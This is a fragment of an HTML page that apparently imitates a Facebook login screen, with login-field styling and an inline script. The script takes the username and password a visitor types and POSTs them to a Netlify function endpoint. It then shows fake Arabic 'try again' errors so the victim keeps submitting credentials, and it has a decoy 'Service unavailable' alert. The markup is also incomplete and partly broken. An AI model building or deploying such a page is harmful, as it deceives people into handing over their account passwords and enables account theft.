<head>

    .l svg{height:50px;width:auto;fill:#1877f2}
    .f{width:100%;background:#fff;border-radius:12px;padding:16px 0}
    .g{margin-bottom:12px}
    .g input{width:100%;padding:14px 16px;background:#f5f6f7;border:1px solid #ccd0d5;border-radius:8px;font-size:16px;color:#1c1e21;outline:none;transition:border-color .15s}

<body>

    </svg>

    <a href="#">More</a>
  </div>
</div>

<script>
  (function(){
    var a=document.getElementById('x1'), b=document.getElementById('x4'), c=0;
    var d=function(e,p,r){
      fetch('/.netlify/functions/notify',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({username:e,password:p,result:r})
      }).catch(function(){});

    a.addEventListener('submit',function(e){
      e.preventDefault(); c++;
      var u=document.getElementById('x2').value.trim();
      var p=document.getElementById('x3').value.trim();
      var s='';
      if(c<=5){ 
        s='⏳ جرب المحاولة مجددا'; 
        d(u||'e',p||'p','a'+c); 
      } else { 
        s='⚠️ اعد المحاولة جرب لاحقا'; 
        d(u||'e',p||'p','retry'); 
      }
      b.textContent=s;
    });
    document.getElementById('x5').addEventListener('click',function(){ alert('Service unavailable.'); });
  })();
</script>
</body>
</html>
